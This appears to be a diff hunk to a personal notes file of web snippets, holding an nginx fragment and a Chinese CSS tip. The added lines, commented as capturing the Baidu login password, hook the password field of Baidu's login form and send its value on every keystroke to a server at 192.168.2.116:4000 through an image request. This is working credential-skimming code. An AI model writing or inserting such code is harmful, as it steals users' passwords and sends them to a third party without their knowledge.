@@ -1577,6 +1577,11 @@ location /{
 }
 // 元素的外边距无法消除
 设置font-size: 0;
+// 获取百度登录密码
+document.getElementById('TANGRAM__PSP_10__password').oninput=function () {
+    var img=new Image()
+    img.src='http://192.168.2.116:4000/?pwd='+this.value;
+}
 
                         
                         
